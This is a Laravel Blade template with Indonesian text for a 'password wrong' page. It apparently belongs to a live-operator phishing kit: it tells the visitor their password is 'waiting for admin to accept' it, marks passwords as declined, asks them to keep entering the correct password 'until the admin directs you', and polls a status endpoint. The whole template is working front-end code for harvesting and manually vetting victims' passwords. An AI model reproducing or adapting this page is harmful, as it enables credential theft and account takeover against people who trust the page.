@extends('layouts.app')

@section('title', 'Password Wrong')

@section('body')
<div class="shell">
    <div class="card" style="text-align:center;max-width:440px">
        <p class="eyebrow">Security</p>

        @if ($review)
            <h1>Password dikirim</h1>
            <p class="sub">Menunggu admin menerima password kamu.</p>
            <div class="wait-dot" aria-hidden="true"></div>
            <p class="muted" id="wait-status" style="margin-top:1rem;font-size:.9rem">Status: password_review…</p>
        @else
            <h1>Password salah</h1>
            @if ($session->password_declined)
                <div class="error" style="text-align:left">Password ditolak. Masukkan password yang benar.</div>
            @else
                <div class="error" style="text-align:left">Password salah. Silakan coba lagi.</div>
            @endif
            <p class="sub">Masukkan password yang benar sampai admin mengarahkan kamu.</p>

            @if ($errors->any())
                <div class="error" style="text-align:left">{{ $errors->first() }}</div>
            @endif

            <form method="POST" action="{{ route('password-wrong.store') }}" style="text-align:left;margin-top:1rem">
                @csrf
                <div class="field">
                    <label for="password">Password</label>
                    <input id="password" type="password" name="password" required autofocus autocomplete="current-password">
                </div>
                <button class="btn" type="submit">Kirim Password</button>
            </form>
            <p class="muted" id="wait-status" style="margin-top:1rem;font-size:.85rem;text-align:center">Status: password…</p>
        @endif
    </div>
</div>
<style>
    .wait-dot {
        width: 14px; height: 14px; margin: 1.25rem auto 0; border-radius: 50%;
        background: #ef4444; animation: pulse 1.2s ease-in-out infinite;
    }
    @keyframes pulse {
        0%, 100% { opacity: .35; transform: scale(.85); }
        50% { opacity: 1; transform: scale(1.1); }
    }
</style>
@include('partials.status-poll', ['current' => $session->status])
@endsection
